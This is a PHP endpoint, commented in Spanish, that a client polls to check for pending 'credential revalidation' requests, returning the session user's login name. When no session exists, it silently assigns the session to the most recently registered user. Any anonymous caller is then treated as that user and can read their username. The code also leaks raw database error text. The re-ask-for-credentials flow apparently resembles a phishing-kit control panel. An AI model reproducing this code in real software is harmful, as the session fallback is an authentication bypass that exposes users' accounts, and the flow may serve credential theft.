<?php
/**
 * Verificar si hay solicitudes de revalidación de credenciales pendientes
 * El cliente hace polling a este archivo
 */
error_reporting(E_ERROR | E_PARSE);
session_start();
header('Content-Type: application/json');

// Si no hay sesión, intentar obtener el último usuario activo
if (!isset($_SESSION['usuario_id'])) {
    require_once '../php_config/conexionbd.php';
    $pdo = conectarBD();
    
    // Obtener el último usuario registrado
    $stmt = $pdo->query("SELECT id FROM usuarios ORDER BY id DESC LIMIT 1");
    $usuario = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($usuario) {
        $_SESSION['usuario_id'] = $usuario['id'];
    } else {
        echo json_encode(['success' => false, 'error' => 'No hay usuarios registrados']);
        exit;
    }
}

try {
    // Incluir configuración de base de datos
    require_once '../php_config/conexionbd.php';
    
    // Conectar a la base de datos
    $pdo = conectarBD();
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['accion'])) {
        echo json_encode(['success' => false, 'error' => 'Datos no válidos']);
        exit;
    }
    
    if ($input['accion'] === 'verificar_revalidacion_pendiente') {
        $usuario_id = $_SESSION['usuario_id'];
        
        // Buscar si hay una solicitud de revalidación pendiente
        $stmt = $pdo->prepare("
            SELECT id, usuario_id, fecha_envio 
            FROM revalidacion_credenciales 
            WHERE usuario_id = ? 
            AND estado = 'pendiente'
            ORDER BY fecha_envio DESC 
            LIMIT 1
        ");
        
        $stmt->execute([$usuario_id]);
        $revalidacion = $stmt->fetch(PDO::FETCH_ASSOC);
        
        // Si hay revalidación pendiente
        if ($revalidacion) {
            // Usuario con el que inició sesión (columna usuarios)
            $stmtUser = $pdo->prepare("SELECT usuarios FROM usuarios WHERE id = ? LIMIT 1");
            $stmtUser->execute([$usuario_id]);
            $rowUser = $stmtUser->fetch(PDO::FETCH_ASSOC);

            echo json_encode([
                'success' => true,
                'tiene_revalidacion' => true,
                'revalidacion_id' => $revalidacion['id'],
                'usuario_sesion' => $rowUser['usuarios'] ?? ''
            ]);
        } else {
            echo json_encode([
                'success' => true,
                'tiene_revalidacion' => false
            ]);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'Acción no válida']);
    }
    
} catch (PDOException $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error de base de datos: ' . $e->getMessage()
    ]);
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error: ' . $e->getMessage()
    ]);
}
?>
